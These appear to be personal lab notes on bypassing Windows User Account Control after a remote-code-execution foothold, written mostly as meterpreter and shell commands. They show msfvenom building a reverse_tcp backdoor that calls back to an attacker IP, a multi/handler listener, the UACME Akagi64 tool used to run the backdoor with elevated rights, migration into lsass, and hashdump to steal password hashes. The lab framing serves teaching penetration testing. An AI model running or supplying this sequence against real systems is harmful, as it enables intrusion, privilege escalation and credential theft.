- User Account Control (UAC) is a Windows security feature introduced in Windows Vista that is used to prevent unauthorized changes from being made to the operating system.

- Attacks can bypass UAC in order to execute malicious executables with elevated privilege.

- In order to succesfully bypass UAC, we will need to have access to a user account that is part of the local administrator group on the Windows system. To see if a user is part of this group:
```powershell
net localgroup administrators
```

[LAB]

1. Exploit RCE vulnerabilty on the HTTP server running on the target and get a meterpreter session.
2. Information Gathering and exploitation:
```powershell
METERPRETER PROMPT:

> sysinfo 

> pgrep explorer
2448
> migrate 2448

> getuid

> getprivs

> shell
> net user
> net localgroup administrators

//ATTACK
// FIRST TERMINAL => Creates a fake vulnerable executable
> msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.41.9 LPORT=9000 -f exe > backdoor.exe

// SECOND TERMINAL
> msfconsole
> use multi/handler
> set payload windows/meterpreter/reverse_tcp
> (Set options)
> run

// Meterpreter
> cd C:\\ 
> mkdir Temp
> cd Temp
> upload backdoor.exe
> upload Akagi64.exe
> shell
> > .\Akagi64.exe 23 C:\Temp\backdoor.exe (23 is the key, see Github repo)

SHELL GAINED
> ps
> sp -S lsass.exe
692
> migrate 692
> sysinfo

> hashdump // TO get the hash
```